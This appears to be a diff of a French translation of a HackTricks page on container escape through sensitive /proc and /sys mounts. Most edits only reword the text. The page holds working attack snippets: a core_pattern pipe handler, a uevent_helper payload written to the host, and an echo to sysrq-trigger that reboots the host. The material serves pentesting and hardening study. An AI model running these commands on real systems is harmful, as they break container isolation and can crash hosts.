@@ -15,22 +15,22 @@ Autres façons de soutenir HackTricks :
 
 L'exposition de `/proc` et `/sys` sans une isolation de l'espace de noms appropriée présente des risques de sécurité importants, notamment l'agrandissement de la surface d'attaque et la divulgation d'informations. Ces répertoires contiennent des fichiers sensibles qui, s'ils sont mal configurés ou consultés par un utilisateur non autorisé, peuvent entraîner une évasion de conteneur, une modification de l'hôte ou fournir des informations aidant à d'autres attaques. Par exemple, le montage incorrect de `-v /proc:/host/proc` peut contourner la protection AppArmor en raison de sa nature basée sur le chemin, laissant `/host/proc` non protégé.
 
-Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).
+**Vous pouvez trouver plus de détails sur chaque vulnérabilité potentielle dans [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts).**
 
 # Vulnérabilités procfs
 
 ## `/proc/sys`
-Ce répertoire permet d'accéder à la modification des variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :
+Ce répertoire permet l'accès pour modifier les variables du noyau, généralement via `sysctl(2)`, et contient plusieurs sous-répertoires préoccupants :
 
 ### **`/proc/sys/kernel/core_pattern`**
 - Décrit dans [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Permet de définir un programme à exécuter lors de la génération d'un fichier core avec les 128 premiers octets comme arguments. Cela peut entraîner une exécution de code si le fichier commence par un pipe `|`.
+- Permet de définir un programme à exécuter lors de la génération du fichier core avec les 128 premiers octets comme arguments. Cela peut entraîner une exécution de code si le fichier commence par un pipe `|`.
 - **Exemple de test et d'exploitation** :
 ```bash
 [ -w /proc/sys/kernel/core_pattern ] && echo Oui # Test d'accès en écriture
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Définit un gestionnaire personnalisé
-sleep 5 && ./crash & # Déclenche le gestionnaire
+echo "|$overlay/shell.sh" > core_pattern # Définir un gestionnaire personnalisé
+sleep 5 && ./crash & # Déclencher le gestionnaire
 ```
 
 ### **`/proc/sys/kernel/modprobe`**
@@ -63,7 +63,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Vérifier l'accès à modprobe
 - Utile pour les attaquants pour identifier les vulnérabilités dans le noyau en cours d'exécution.
 
 ### **`/proc/sysrq-trigger`**
-- Permet d'invoquer des commandes Sysrq, provoquant potentiellement des redémarrages immédiats du système ou d'autres actions critiques.
+- Permet d'invoquer des commandes Sysrq, pouvant entraîner des redémarrages immédiats du système ou d'autres actions critiques.
 - **Exemple de redémarrage de l'hôte** :
 ```bash
 echo b > /proc/sysrq-trigger # Redémarre l'hôte
@@ -75,7 +75,7 @@ echo b > /proc/sysrq-trigger # Redémarre l'hôte
 
 ### **`/proc/kallsyms`**
 - Liste les symboles exportés du noyau et leurs adresses.
-- Essentiel pour le développement d'exploits du noyau, en particulier pour contourner le KASLR.
+- Essentiel pour le développement d'exploits du noyau, en particulier pour surmonter le KASLR.
 - Les informations d'adresse sont restreintes avec `kptr_restrict` défini sur `1` ou `2`.
 - Détails dans [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -110,14 +110,14 @@ echo b > /proc/sysrq-trigger # Redémarre l'hôte
 
 ### **`/sys/kernel/uevent_helper`**
 - Utilisé pour gérer les `uevents` des périphériques du noyau.
-- Écrire dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors de déclenchements `uevent`.
+- L'écriture dans `/sys/kernel/uevent_helper` peut exécuter des scripts arbitraires lors des déclenchements `uevent`.
 - **Exemple d'exploitation** :
 %%%bash
 # Crée une charge utile
 echo "#!/bin/sh" > /evil-helper
 echo "ps > /output" >> /evil-helper
 chmod +x /evil-helper
-# Trouve le chemin de l'hôte depuis le montage OverlayFS pour le conteneur
+# Trouve le chemin de l'hôte à partir du montage OverlayFS pour le conteneur
 host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 # Définit uevent_helper sur l'assistant malveillant
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
@@ -128,13 +128,13 @@ cat /output
 %%%
 
 ### **`/sys/class/thermal`**
-- Contrôle les paramètres de température, pouvant causer des attaques DoS ou des dommages physiques.
+- Contrôle les paramètres de température, pouvant entraîner des attaques de déni de service ou des dommages physiques.
 
 ### **`/sys/kernel/vmcoreinfo`**
-- Fuites d'adresses du noyau, compromettant potentiellement le KASLR.
+- Fuites les adresses du noyau, compromettant potentiellement le KASLR.
 
 ### **`/sys/kernel/security`**
-- Héberge l'interface `securityfs`, permettant la configuration des modules de sécurité Linux comme AppArmor.
+- Contient l'interface `securityfs`, permettant la configuration des modules de sécurité Linux comme AppArmor.
 - L'accès pourrait permettre à un conteneur de désactiver son système MAC.
 
 ### **`/sys/firmware/efi/vars` et `/sys/firmware/efi/efivars`**
